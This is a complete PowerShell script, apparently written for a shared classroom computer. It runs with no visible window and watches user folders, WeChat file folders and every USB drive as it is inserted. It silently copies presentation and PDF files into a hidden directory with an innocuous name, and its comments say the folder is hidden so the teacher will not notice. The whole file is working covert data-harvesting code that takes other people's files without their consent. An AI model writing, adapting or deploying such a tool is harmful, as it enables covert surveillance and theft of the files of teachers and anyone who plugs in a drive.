# ppt-archiver.ps1
# 静默运行：屏幕不显示任何窗口，发现课件自动复制到本机隐藏目录。

$ErrorActionPreference = 'Continue'

# --- 要抓的文件类型（想连Word一起抓，就加上 '.doc','.docx'）---
$global:WantedExt = @('.ppt', '.pptx', '.pps', '.ppsx', '.pdf')

# --- 运行多少小时后自动退出（设置 87600=10年，等同永不退出）---
$global:AutoStopHours = 87600

# --- 全局状态 ---
$global:StartTime     = Get-Date
$global:Pending       = New-Object 'System.Collections.Concurrent.ConcurrentDictionary[string,psobject]'
$global:Watchers      = New-Object System.Collections.ArrayList
$global:WatchedPaths  = New-Object System.Collections.ArrayList
$global:Running       = $true


# ------------------------------------------------------------
# 决定归档目录：强制使用 D:\AppCacheData
# 原因：本机装了冰点/还原卡，C盘每次重启都被还原，
#       只有 D 盘是"持久化"分区，归档在这里才不会被清掉。
#       目录设为隐藏，名字不起眼，避免被老师发现。
# ------------------------------------------------------------
function global:Resolve-ArchiveRoot {
	# 候选顺序：D盘 → 其他非系统固定盘 → C盘ProgramData（兜底）
	$cands = New-Object System.Collections.Generic.List[string]
	$cands.Add('D:\AppCacheData')  # 强制首选 D 盘（冰点环境下唯一可靠位置）
	try {
		$fixed = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" |
			Sort-Object -Property @{Expression = { $_.DeviceID -eq 'C:' }}
		foreach ($d in $fixed) {
			$cands.Add((Join-Path $d.DeviceID 'AppCacheData'))
		}
	} catch {}
	$cands.Add('C:\ProgramData\AppCacheData')

	foreach ($c in ($cands | Select-Object -Unique)) {
		try {
			New-Item -ItemType Directory -Path $c -Force -ErrorAction Stop | Out-Null
			$t = Join-Path $c ('.wt_' + [guid]::NewGuid().ToString('N'))
			[IO.File]::WriteAllText($t, 'x')
			Remove-Item -LiteralPath $t -Force
			# 写标记文件（供 open.bat 定位）
			[IO.File]::WriteAllText((Join-Path $c '.marker'), 'ok')
			# 设为隐藏目录
			$item = Get-Item -LiteralPath $c -Force
			if (-not ($item.Attributes -band [IO.FileAttributes]::Hidden)) {
				$item.Attributes = $item.Attributes -bor [IO.FileAttributes]::Hidden
			}
			return $c.TrimEnd('\')
		} catch {}
	}
	return (Join-Path $env:TEMP 'AppCacheData')
}


# ------------------------------------------------------------
# 写日志（写入归档目录下的 log.txt，无界面输出）
# ------------------------------------------------------------
function global:LogLine {
	param([string]$Msg)
	try {
		$line = '[{0}] {1}' -f (Get-Date -Format 'HH:mm:ss'), $Msg
		$log = Join-Path $global:ArchiveRoot 'log.txt'
		$enc = New-Object System.Text.UTF8Encoding($false)
		[IO.File]::AppendAllText($log, $line + "`r`n", $enc)
	} catch {}
}


# ------------------------------------------------------------
# 发现疑似课件时放进待处理队列（事件回调里只做这一件事，快）
# ------------------------------------------------------------
function global:Queue-File {
	param([string]$Path)
	try {
		if ([string]::IsNullOrWhiteSpace($Path)) { return }
		if ($Path.StartsWith($global:ArchiveRoot, [StringComparison]::OrdinalIgnoreCase)) { return }
		$leaf = Split-Path $Path -Leaf
		if ($leaf.StartsWith('~')) { return }
		$ext = [IO.Path]::GetExtension($Path).ToLower()
		if ($global:WantedExt -notcontains $ext) { return }
		$st = [pscustomobject]@{ last = -1; same = 0; tries = 0 }
		$global:Pending.TryAdd($Path, $st) | Out-Null
	} catch {}
}


# ------------------------------------------------------------
# 真正复制文件：
# - 文件大小连续多次不变，说明已经拷完/写完
# - 用 FileShare.ReadWrite 打开，PPT正被Office占用也能读
# - 同名同大小视为已归档；同名不同内容自动加序号
# ------------------------------------------------------------
function global:Save-Copy {
	param([string]$Src)
	try {
		$dayDir = Join-Path $global:ArchiveRoot (Get-Date -Format 'yyyy-MM-dd')
		New-Item -ItemType Directory -Path $dayDir -Force | Out-Null

		$srcLen = (Get-Item -LiteralPath $Src).Length
		$leaf   = Split-Path $Src -Leaf
		$target = Join-Path $dayDir $leaf

		if (Test-Path -LiteralPath $target) {
			if ((Get-Item -LiteralPath $target).Length -eq $srcLen) {
				LogLine "skip(exists): $leaf"
				return $true
			}
			$base = [IO.Path]::GetFileNameWithoutExtension($leaf)
			$ext  = [IO.Path]::GetExtension($leaf)
			$i = 2
			while (Test-Path -LiteralPath (Join-Path $dayDir ("{0}_{1}{2}" -f $base, $i, $ext))) { $i++ }
			$target = Join-Path $dayDir ("{0}_{1}{2}" -f $base, $i, $ext)
		}

		$in = [IO.File]::Open($Src, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
		try {
			$out = [IO.File]::Create($target)
			try { $in.CopyTo($out) } finally { $out.Close() }
		} finally { $in.Close() }

		if ((Get-Item -LiteralPath $target).Length -ne $srcLen) {
			Remove-Item -LiteralPath $target -Force
			return $false
		}
		LogLine ("saved: {0} <- {1}" -f $leaf, $Src)
		return $true
	} catch {
		return $false
	}
}


# ------------------------------------------------------------
# 主循环每2秒处理一次队列：大小稳定后才复制
# ------------------------------------------------------------
function global:Process-Pending {
	foreach ($key in @($global:Pending.Keys)) {
		$st = $global:Pending[$key]
		if (-not (Test-Path -LiteralPath $key)) {
			$st.tries++
			if ($st.tries -gt 5) { $global:Pending.TryRemove($key, [ref]$null) | Out-Null }
			continue
		}
		$len = (Get-Item -LiteralPath $key).Length
		if ($len -le 0) { continue }

		if ($len -eq $st.last) { $st.same++ } else { $st.same = 0; $st.last = $len }

		# 连续3次(约6秒)大小不变，认为文件已经写完
		if ($st.same -ge 2) {
			if (Save-Copy $key) {
				$global:Pending.TryRemove($key, [ref]$null) | Out-Null
			} else {
				$st.tries++; $st.same = 0
				if ($st.tries -gt 10) { $global:Pending.TryRemove($key, [ref]$null) | Out-Null }
			}
		}
	}
}


# ------------------------------------------------------------
# 给一个目录挂文件监视器
# ------------------------------------------------------------
function global:Add-Watcher {
	param([string]$Path, [bool]$SubDirs = $true)
	if (-not (Test-Path -LiteralPath $Path)) { return }
	$full = (Resolve-Path -LiteralPath $Path).Path.TrimEnd('\')
	if ($global:WatchedPaths -contains $full) { return }
	try {
		$w = New-Object IO.FileSystemWatcher $full
		$w.IncludeSubdirectories = $SubDirs
		$w.NotifyFilter = [IO.NotifyFilters]'FileName,LastWrite,Size,DirectoryName'
		$w.InternalBufferSize = 65536

		$action = {
			try {
				$p = $Event.SourceEventArgs.FullPath
				if ($p) { Queue-File -Path $p }
			} catch {}
		}
		Register-ObjectEvent -InputObject $w -EventName Created -Action $action | Out-Null
		Register-ObjectEvent -InputObject $w -EventName Changed -Action $action | Out-Null
		Register-ObjectEvent -InputObject $w -EventName Renamed -Action $action | Out-Null

		$w.EnableRaisingEvents = $true
		[void]$global:Watchers.Add($w)
		[void]$global:WatchedPaths.Add($full)
		LogLine "watching: $full"
	} catch {}
}


# ------------------------------------------------------------
# 启动前先把目录前两层已有的课件扫进队列（兜底）
# ------------------------------------------------------------
function global:Initial-Scan {
	param([string]$Path)
	try {
		Get-ChildItem -LiteralPath $Path -Depth 2 -File -ErrorAction SilentlyContinue |
			Where-Object { $global:WantedExt -contains $_.Extension.ToLower() } |
			ForEach-Object { Queue-File -Path $_.FullName }
	} catch {}
}


# ------------------------------------------------------------
# 监视当前所有U盘
# ------------------------------------------------------------
function global:Add-RemovableWatchers {
	try {
		Get-CimInstance Win32_LogicalDisk -Filter "DriveType=2" | ForEach-Object {
			$r = $_.DeviceID + '\'
			Add-Watcher -Path $r -SubDirs $true
			Initial-Scan -Path $r
		}
	} catch {}
}


# ------------------------------------------------------------
# U盘拔出后清掉失效的监视器
# ------------------------------------------------------------
function global:Sync-Watchers {
	for ($i = $global:Watchers.Count - 1; $i -ge 0; $i--) {
		$w = $global:Watchers[$i]
		$root = $w.Path
		if ($root -match '^[A-Za-z]:\\$') {
			$id = $root.TrimEnd('\')
			$isRemovable = $false
			try {
				$isRemovable = ((Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$id'").DriveType -eq 2)
			} catch {}
			if ($isRemovable -and -not (Test-Path $root)) {
				try { $w.EnableRaisingEvents = $false; $w.Dispose() } catch {}
				[void]$global:Watchers.RemoveAt($i)
				[void]$global:WatchedPaths.Remove($root.TrimEnd('\'))
				LogLine "removed watcher: $root"
			}
		}
	}
}


# ============================================================
# 正式启动（全程静默）
# ============================================================
$global:ArchiveRoot = Resolve-ArchiveRoot
LogLine 'archiver started'

$localWatch = @(
	"$env:USERPROFILE\Desktop",
	"$env:USERPROFILE\Downloads",
	"$env:USERPROFILE\Documents",
	"$env:USERPROFILE\xwechat_files",
	"$env:APPDATA\Kingsoft",
	"$env:LOCALAPPDATA\Kingsoft"
)
foreach ($p in $localWatch) {
	Add-Watcher -Path $p -SubDirs $true
	Initial-Scan -Path $p
}
Add-RemovableWatchers

# 监听U盘插入事件
try {
	Register-CimIndicationEvent -Query "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType=2" `
		-SourceIdentifier 'PPTUsbArrive' -Action { Add-RemovableWatchers } | Out-Null
} catch {}

while ($global:Running) {
	Process-Pending
	Start-Sleep -Seconds 2
	if (((Get-Date) - $global:StartTime).TotalHours -ge $global:AutoStopHours) {
		$global:Running = $false
	}
	$tick += 2
	if ($tick % 30 -eq 0) {
		Sync-Watchers
		Add-RemovableWatchers
	}
}

foreach ($w in $global:Watchers) {
	try { $w.EnableRaisingEvents = $false; $w.Dispose() } catch {}
}
LogLine 'archiver exited'
